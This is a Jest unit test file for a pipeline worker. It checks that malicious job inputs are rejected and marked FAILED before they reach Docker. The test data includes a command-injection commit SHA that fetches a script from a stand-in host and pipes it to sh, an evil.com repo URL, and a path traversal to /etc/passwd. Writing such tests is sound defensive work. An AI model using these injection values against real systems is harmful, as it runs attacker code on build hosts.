/**
 * Unit tests for pipeline worker input validation.
 * Tests that the worker rejects malicious inputs before they reach Docker.
 */

const mockPipelineRunUpdate = jest.fn().mockResolvedValue({});

// We need to mock several dependencies before requiring the worker
jest.mock('bullmq', () => ({
  Worker: jest.fn().mockImplementation((queueName, processor) => {
    // Store the processor so tests can invoke it
    const instance = {
      processor,
      on: jest.fn(),
    };
    return instance;
  }),
}));

jest.mock('../../src/utils/queue', () => ({
  connection: { host: '127.0.0.1', port: 6379 },
}));

jest.mock('@prisma/client', () => ({
  PrismaClient: jest.fn().mockImplementation(() => ({
    pipelineRun: {
      update: mockPipelineRunUpdate,
      findUnique: jest.fn().mockResolvedValue({ id: 'dummy', repository: { ownerId: 'user1' } }),
    },
  })),
}));

jest.mock('../../src/utils/logger', () => ({
  logger: {
    info: jest.fn(),
    error: jest.fn(),
    warn: jest.fn(),
  },
}));

jest.mock('dockerode', () => {
  return jest.fn().mockImplementation(() => ({
    pull: jest.fn(),
    createContainer: jest.fn(),
  }));
});

jest.mock('fs', () => ({
  existsSync: jest.fn().mockReturnValue(true),
  mkdirSync: jest.fn(),
  writeFileSync: jest.fn(),
}));

describe('Pipeline Worker Input Validation', () => {
  let workerInstance;

  beforeAll(() => {
    // Require after mocks are set up
    const { pipelineWorker } = require('../../src/workers/pipelineWorker');
    workerInstance = pipelineWorker;
  });

  beforeEach(() => {
    mockPipelineRunUpdate.mockClear();
  });

  const validRepoUrl = 'https://github.com/user/repo';
  const validCommitSha = 'a'.repeat(40); // 40 hex chars

  describe('commitSha validation', () => {
    it('should reject commit SHA with shell injection payload', async () => {
      const job = {
        data: {
          pipelineId: 'test-pipeline-1',
          repoUrl: validRepoUrl,
          commitSha: '$(curl http://evil.com/pwn.sh | sh)',
        },
      };

      await workerInstance.processor(job);

      // Should have been called with FAILED status
      const lastCall = mockPipelineRunUpdate.mock.calls.at(-1);
      expect(lastCall[0].data.status).toBe('FAILED');
    });

    it('should reject commit SHA that is too short', async () => {
      const job = {
        data: {
          pipelineId: 'test-pipeline-2',
          repoUrl: validRepoUrl,
          commitSha: 'abc123', // Only 6 chars, not 40
        },
      };

      await workerInstance.processor(job);

      const lastCall = mockPipelineRunUpdate.mock.calls.at(-1);
      expect(lastCall[0].data.status).toBe('FAILED');
    });

    it('should reject commit SHA with non-hex characters', async () => {
      const job = {
        data: {
          pipelineId: 'test-pipeline-3',
          repoUrl: validRepoUrl,
          commitSha: 'g'.repeat(40), // 'g' is not a valid hex character
        },
      };

      await workerInstance.processor(job);

      const lastCall = mockPipelineRunUpdate.mock.calls.at(-1);
      expect(lastCall[0].data.status).toBe('FAILED');
    });
  });

  describe('repoUrl validation', () => {
    it('should reject repo URL with command injection', async () => {
      const job = {
        data: {
          pipelineId: 'test-pipeline-4',
          repoUrl: 'https://evil.com/malicious',
          commitSha: validCommitSha,
        },
      };

      await workerInstance.processor(job);

      const lastCall = mockPipelineRunUpdate.mock.calls.at(-1);
      expect(lastCall[0].data.status).toBe('FAILED');
    });

    it('should reject non-GitHub repo URLs', async () => {
      const job = {
        data: {
          pipelineId: 'test-pipeline-5',
          repoUrl: 'https://gitlab.com/user/repo',
          commitSha: validCommitSha,
        },
      };

      await workerInstance.processor(job);

      const lastCall = mockPipelineRunUpdate.mock.calls.at(-1);
      expect(lastCall[0].data.status).toBe('FAILED');
    });

    it('should reject repo URL with path traversal', async () => {
      const job = {
        data: {
          pipelineId: 'test-pipeline-6',
          repoUrl: 'https://github.com/../../../etc/passwd',
          commitSha: validCommitSha,
        },
      };

      await workerInstance.processor(job);

      const lastCall = mockPipelineRunUpdate.mock.calls.at(-1);
      expect(lastCall[0].data.status).toBe('FAILED');
    });
  });
});
